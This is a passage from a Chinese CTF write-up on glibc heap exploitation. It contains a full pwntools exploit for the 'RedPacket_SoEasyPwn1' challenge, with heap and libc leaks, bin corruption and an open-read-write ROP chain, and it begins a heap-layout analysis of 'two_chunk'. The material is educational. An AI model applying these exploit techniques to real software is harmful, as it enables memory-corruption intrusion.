触发攻击
    creat(sh,3,2,'Chunk_3')
###
###  构造ROP链
经过检测，发现程序开启了SandBox。
那么我们采取`Open-Read-Write`的利用方式。
⚠️：Read函数的第一个参数文件描述符从0开始累加，程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，这样在程序中，每打开一个文件，文件描述符值从3开始累加。
因为我们无法获取PIE的值，于是选择从libc中寻找gadget。
至此，我们可以顺利的构造ROP链。
    ROP_chain  = '/flag\x00\x00\x00'
    ROP_chain += p64(pop_rdi_ret)
    ROP_chain += p64(file_name_addr)
    ROP_chain += p64(pop_rsi_ret)
    ROP_chain += p64(0)
    ROP_chain += p64(libc_base+libc.symbols['open'])
    ROP_chain += p64(pop_rdi_ret)
    ROP_chain += p64(3)
    ROP_chain += p64(pop_rsi_ret)
    ROP_chain += p64(flag_addr)
    ROP_chain += p64(pop_rdx_ret)
    ROP_chain += p64(0x40)
    ROP_chain += p64(libc_base+libc.symbols['read'])
    ROP_chain += p64(pop_rdi_ret)
    ROP_chain += p64(1)
    ROP_chain += p64(pop_rsi_ret)
    ROP_chain += p64(flag_addr)
    ROP_chain += p64(pop_rdx_ret)
    ROP_chain += p64(0x40)
    ROP_chain += p64(libc_base+libc.symbols['write'])
### Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    ​
    RedPacket_SoEasyPwn1=ELF('RedPacket_SoEasyPwn1')
    ​
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elif context.arch == 'i386':
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    ​
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./")
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./RedPacket_SoEasyPwn1")
    ​
    def get_address(sh,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'\x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    ​
    def get_flag(sh):
        # sh.recv()
        sh.sendline('ls')
        sh.recv()
        sh.sendline('cat /flag')
        return sh.recvline()
    ​
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    ​
    def creat(sh,index,chunk_size_index,value):
        sh.recvuntil('Your input: ')
        sh.sendline('1')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
        sh.recvuntil('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
        sh.sendline(str(chunk_size_index))
        sh.recvuntil('Please input content: ')
        sh.sendline(value)
    ​
    def delete(sh,index):
        sh.recvuntil('Your input: ')
        sh.sendline('2')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
    ​
    def edit(sh,index,value):
        sh.recvuntil('Your input: ')
        sh.sendline('3')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
        sh.recvuntil('Please input content: ')
        sh.sendline(value)
    ​
    def show(sh,index):
        sh.recvuntil('Your input: ')
        sh.sendline('4')
        sh.recvuntil('Please input the red packet idx: ')
        sh.sendline(str(index))
    ​
    if __name__ == "__main__":
        sh = get_sh()
    ​
        for i in range(7):
            creat(sh,15,4,'Chunk_15')
            delete(sh,15)
    ​
        for i in range(6):
            creat(sh,14,2,'Chunk_14')
            delete(sh,14)
    ​
    ​
        show(sh,15)
        last_chunk_addr = get_address(sh,'We get last chunk address is ','','\x0A')
        heap_addr = last_chunk_addr - 0x26C0
        log.success('We get heap address is ' + str(hex(heap_addr)))
    ​
        creat(sh,1,4,'Chunk_1')
        creat(sh,13,3,'Chunk_13')
        delete(sh,1)
        show(sh,1)
        libc_base = get_address(sh,'We leak main arena address is ','','\x0A') - 0x1E4CA0
        log.success('We get libc base address is ' + str(hex(libc_base)))
    ​
    ​
        creat(sh,13,3,'Chunk_13')
        creat(sh,13,3,'Chunk_13')
    ​
        creat(sh,2,4,'Chunk_2')
        creat(sh,13,4,'Chunk_13')
        delete(sh,2)
        creat(sh,13,3,'Chunk_13')
        creat(sh,13,3,'Chunk_13')
    ​
    ​
        payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
        edit(sh,2,payload)
    ​
        creat(sh,3,2,'Chunk_3')
    ​
    ​
        pop_rdi_ret = libc_base + 0x0000000000026542
        pop_rsi_ret = libc_base + 0x0000000000026f9e
        pop_rdx_ret = libc_base + 0x000000000012bda6
        file_name_addr = heap_addr + 0x0000000000004A40
        flag_addr = file_name_addr + 0x0000000000000200
        ROP_chain  = '/flag\x00\x00\x00'
        ROP_chain += p64(pop_rdi_ret)
        ROP_chain += p64(file_name_addr)
        ROP_chain += p64(pop_rsi_ret)
        ROP_chain += p64(0)
        ROP_chain += p64(libc_base+libc.symbols['open'])
        ROP_chain += p64(pop_rdi_ret)
        ROP_chain += p64(3)
        ROP_chain += p64(pop_rsi_ret)
        ROP_chain += p64(flag_addr)
        ROP_chain += p64(pop_rdx_ret)
        ROP_chain += p64(0x40)
        ROP_chain += p64(libc_base+libc.symbols['read'])
        ROP_chain += p64(pop_rdi_ret)
        ROP_chain += p64(1)
        ROP_chain += p64(pop_rsi_ret)
        ROP_chain += p64(flag_addr)
        ROP_chain += p64(pop_rdx_ret)
        ROP_chain += p64(0x40)
        ROP_chain += p64(libc_base+libc.symbols['write'])
    ​
        creat(sh,4,4,ROP_chain)
    ​
        leave_ret = libc_base + 0x0000000000058373
        sh.recvuntil('Your input: ')
        sh.sendline('666')
        sh.recvuntil('What do you want to say?')
        sh.sendline('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
        sh.interactive()
## 0x04 以2020-XCTF-高校战疫赛 two_chunk为例
### 题目分析
程序使用了2.30的Libc，但是本题的相关利用与2.30新增的保护机制无关，因此我们使用libc2.29完成利用。
保护全部开启。
程序使用`Calloc`进行`Chunk`的分配，编辑函数仅能编辑一次，且编辑时可以溢出0x20字节。
### 向Small Bin中加入两个Chunk
首先`Creat(sh,0,0x188)`然后再`Creat(sh,1,0x300)`，这个`0x300`大小的`Chunk`是为了防止`Chunk`被`Top
Chunk`合并，这里我们将这个`Chunk`视为`Chunk 2`。堆内存情况如下：
    Chunk 0 (in use)(0x190)
    Chunk 2 (in use)(0x310)
紧接着释放`Chunk 0`，这个`Chunk`会被加入`Unsorted Bin`，再`Creat(sh,0,0xF0)`，程序会从`Chunk
0`中切割走`0x100`大小，这里我们将剩余的大小视为`Chunk 1`。堆内存情况如下：
    Chunk 0 (in use)(0x100)
    Chunk 1 (no use)(0x90 ) <- Unsorted Bin
    Chunk 2 (in use)(0x310)
之后我们释放`Chunk 0`,再次`Creat(sh,0,0x100)`，`Chunk 1`会被加入`Small Bin`。然后我们释放`Chunk
0`、`Chunk 1`。堆内存情况如下：
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
之后我们`Creat(sh,0,0x188)`然后再`Creat(sh,1,0x300)`，这个`0x300`大小的`Chunk`是为了防止`Chunk`被`Top
Chunk`合并，这里我们将这个`Chunk`视为`Chunk 6`。堆内存情况如下：
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
    Chunk 4 (in use)(0x190)
    Chunk 6 (in use)(0x310) 
紧接着释放`Chunk 4`，这个`Chunk`会被加入`Unsorted Bin`，再`Creat(sh,0,0xF0)`，程序会从`Chunk
4`中切割走`0x100`大小，这里我们将剩余的大小视为`Chunk 5`。堆内存情况如下：
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
    Chunk 4 (in use)(0x100)
    Chunk 5 (no use)(0x90 ) <- Unsorted Bin
    Chunk 6 (in use)(0x310) 
之后我们释放`Chunk 6`,再次`Creat(sh,0,0x100)`，`Chunk 5`会被加入`Small Bin`。堆内存情况如下：
    Chunk 0 (no use)(0x110) <- Tcache Bin
    Chunk 1 (no use)(0x90 ) <- Small Bin
    Chunk 2 (no use)(0x310) <- Tcache Bin
    Chunk 3 (no use)(0x110) <- Chunk 0 <- Tcache Bin
    Chunk 4 (in use)(0x100)
    Chunk 5 (no use)(0x90 ) <- Chunk 1 <- Small Bin